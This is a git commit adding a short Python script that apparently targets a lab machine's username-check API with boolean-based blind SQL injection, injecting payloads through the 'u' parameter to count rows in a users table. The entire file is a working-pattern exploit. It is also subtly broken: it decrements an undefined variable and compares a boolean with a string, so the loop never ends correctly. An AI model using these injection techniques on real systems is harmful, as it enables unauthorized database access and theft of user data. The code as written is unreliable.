9edd3cf0844d0397815b74d54c8a2cc6e7b9c488
Raafat Abualazm <raafat.abualazm96@gmail.com>
2025-03-11 07:51:36 +0000

    Get table length

---
+++ basic-oracle.py
@@ -0,0 +1,30 @@
+#!/usr/bin/python3
+
+import requests
+import json
+import sys
+from urllib.parse import quote_plus
+
+# The user we are targeting
+target = "maria"
+ip = "10.129.204.197"
+# Checks if query `q` evaluates as `true` or `false`
+def oracle(q):
+    p = quote_plus(f"{target}' AND ({q})-- -")
+    r = requests.get(
+        f"http://{ip}/api/check-username.php?u={p}"
+    )
+    j = json.loads(r.text)
+    return j['status'] == 'taken'
+
+# Get rows in users table
+rows = 100
+while rows > 0:
+    query = f"(select count(*) from users) > {rows}"
+    status = oracle(query)
+    if status == "taken":
+        break
+    else:
+        row -= 1
+
+print(rows)
